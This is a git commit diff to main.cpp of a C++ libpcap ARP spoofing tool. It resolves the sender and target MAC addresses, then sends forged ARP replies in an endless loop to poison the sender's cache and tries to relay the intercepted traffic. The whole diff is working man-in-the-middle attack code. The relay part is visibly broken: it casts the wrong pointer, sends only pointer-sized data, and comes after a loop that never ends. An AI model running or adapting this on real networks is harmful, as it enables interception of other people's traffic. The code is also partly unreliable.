2ee06009d1a6dd3ffa23089d073f16853aa4f9a8
w8385 <w8385@naver.com>
2022-08-28 03:17:55 +0900

    print info

--- main.cpp
+++ main.cpp
@@ -4,6 +4,7 @@
 #include "arphdr.h"
 #include <fstream>
 #include <iostream>
+#include <unistd.h>
 #include <stdlib.h>
 #include <string.h>
 using namespace std;
@@ -37,83 +38,124 @@ int main(int argc, char* argv[]) {
 	// myMAC capture
 	ifstream iface("/sys/class/net/" + string(dev) + "/address");
   	string MY_MAC((istreambuf_iterator<char>(iface)), istreambuf_iterator<char>());
-  	cout << "System MAC Address is : " << MY_MAC;
-  	
-	FILE *fp;
-	string get_ip_string = string("ifconfig ") + string(dev) + string(" | grep \"inet \" | awk -F ' ' '{print $2}'");
+ 	
+	// myIP capture	
+	string get_ip_string = string("ifconfig ") + string(dev) \
+			       + string(" | grep \"inet \" | awk -F ' ' '{print $2}'");
 	char get_ip[30];
 	strcpy(get_ip, get_ip_string.c_str());
+	
+	FILE *fp;
 	fp = popen(get_ip, "r");
 	fgets(errbuf, PCAP_ERRBUF_SIZE, fp);
-	printf("My IP Address is : %s", errbuf);
 	pclose(fp);
 
-  	Mac myMAC = (Mac)MY_MAC;
-	Mac senderMAC;
-	Ip myIP = Ip(errbuf);
-	Ip senderIP = Ip(argv[2]);
-	Ip targetIP = Ip(argv[3]);
+	// init Mac & Ip
+  	Mac myMac 	= (Mac)MY_MAC;
+	Mac senderMac;
+	senderMac.clear();
+	Mac targetMac;
+	targetMac.clear();
+
+	Ip  myIp 		= Ip(errbuf);
+	Ip  senderIp 	= Ip(argv[2]);
+	Ip  targetIp 	= Ip(argv[3]);
 	
+	// print Mac & Ip
+	cout << "My 	IP  : " << string(myIp)		<< '\n';
+	cout << "sender	IP  : " << string(senderIp) << '\n';
+	cout << "target	IP  : " << string(targetIp) << '\n';
+	cout << '\n';
 	
-	EthArpPacket packet;
+  	cout << "My 	MAC : " << MY_MAC;
 
-	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
-	packet.eth_.smac_ = myMAC;
-	packet.eth_.type_ = htons(EthHdr::Arp);
+	
+	// Get senderMac & targetMac
+	EthArpPacket packetGet;
 
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
-	packet.arp_.op_ = htons(ArpHdr::Request);
-	packet.arp_.smac_ = myMAC;
-	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-	packet.arp_.sip_ = htonl(myIP);
-	packet.arp_.tip_ = htonl(senderIP);
+	packetGet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
+	packetGet.eth_.smac_ = myMac;
+	packetGet.eth_.type_ = htons(EthHdr::Arp);
 
-	// broadcast
-	int res_request = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+	packetGet.arp_.hrd_  = htons(ArpHdr::ETHER);
+	packetGet.arp_.pro_  = htons(EthHdr::Ip4);
+	packetGet.arp_.hln_  = Mac::SIZE;
+	packetGet.arp_.pln_  = Ip::SIZE;
+	packetGet.arp_.op_   = htons(ArpHdr::Request);
+	packetGet.arp_.smac_ = myMac;
+	packetGet.arp_.tmac_ = Mac("00:00:00:00:00:00");
+	packetGet.arp_.sip_  = htonl(myIp);
+	packetGet.arp_.tip_  = htonl(senderIp);
+
+		// broadcast
+	int res_request = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packetGet), sizeof(EthArpPacket));
 	if (res_request != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_request, pcap_geterr(handle));
 	}
 	
-	// senderIP capture
+		// senderMac & targetMac capture
 	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-	while(1) {
+	while(senderMac.isNull() || targetMac.isNull()) {
 		struct pcap_pkthdr* req_header; 	//time & length
-		const u_char* req_packet;		//packet pointer
-		int res_pcap = pcap_next_ex(pcap, &req_header, &req_packet);
+		const  u_char* 	    req_packet;		//packet pointer
+		int    res_pcap   = pcap_next_ex(pcap, &req_header, &req_packet);
 		
 		EthArpPacket *ea_packet = (EthArpPacket*)req_packet;
-		if(ea_packet->arp_.sip() == senderIP){
-			senderMAC = ea_packet->arp_.smac();
-		  	cout << "Sender MAC Address is : " << string(senderMAC);
-		  	break;
+		if(ea_packet->arp_.sip() == senderIp)
+			senderMac = ea_packet->arp_.smac();
+		else if(ea_packet->arp_.tip() == senderIp)
+			senderMac = ea_packet->arp_.tmac();	
+		else if(ea_packet->arp_.sip() == targetIp)
+			targetMac = ea_packet->arp_.smac();
+		else if(ea_packet->arp_.tip() == targetIp)
+			targetMac = ea_packet->arp_.tmac();
+	}
+  	cout << "Sender	MAC : " << string(senderMac) << '\n';
+	cout << "Target	MAC : " << string(targetMac) << '\n';
+	cout << '\n';
+
+	// Arp packet	
+	EthArpPacket packetArp;
+	
+	packetArp.eth_.dmac_ = senderMac;
+	packetArp.eth_.smac_ = myMac;
+	packetArp.eth_.type_ = htons(EthHdr::Arp);
+
+	packetArp.arp_.hrd_  = htons(ArpHdr::ETHER);
+	packetArp.arp_.pro_  = htons(EthHdr::Ip4);
+	packetArp.arp_.hln_  = Mac::SIZE;
+	packetArp.arp_.pln_  = Ip::SIZE;
+	packetArp.arp_.op_   = htons(ArpHdr::Reply);
+	packetArp.arp_.smac_ = myMac;
+	packetArp.arp_.tmac_ = senderMac;
+	packetArp.arp_.sip_  = htonl(targetIp);
+	packetArp.arp_.tip_  = htonl(senderIp);
+
+	// Send Arp packet 
+	cout << "Arp send ..." << '\n';
+	while(true){
+		int resArp = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packetArp), sizeof(EthArpPacket));
+		if (resArp != 0) {
+			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", resArp, pcap_geterr(handle));
 		}
+		sleep(1);
 	}
 
-	packet.eth_.dmac_ = senderMAC;
-	packet.eth_.smac_ = myMAC;
-	packet.eth_.type_ = htons(EthHdr::Arp);
-
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
-	packet.arp_.op_ = htons(ArpHdr::Reply);
-	packet.arp_.smac_ = myMAC;
-	packet.arp_.tmac_ = senderMAC;
-	packet.arp_.sip_ = htonl(targetIP);
-	packet.arp_.tip_ = htonl(senderIP);
-	
-	// Arp attack
-	printf("\nArp attck start ...\n");
-//	while(1){
-		int res_arp = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-		if (res_arp != 0) {
-			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_arp, pcap_geterr(handle));
+	// Get Spoofed Packet
+	pcap_t* pcapSpoof = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+	while(true) {
+		struct pcap_pkthdr* headerSpoof;
+		const  u_char*	    packetSpoof;
+		int    resSpoof   = pcap_next_ex(pcapSpoof, &headerSpoof, &packetSpoof);
+		
+		EthHdr *ethSpoof = reinterpret_cast<EthHdr*>(&packetSpoof);	
+		// Send Relay Packet
+		if (ethSpoof->smac_ == senderMac){
+			ethSpoof->smac_ = myMac;
+			ethSpoof->dmac_ = targetMac;
 		}
-//	}
+		int resRelay = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packetSpoof), sizeof(u_char*));
+	}
 	
 	pcap_close(handle);
 }
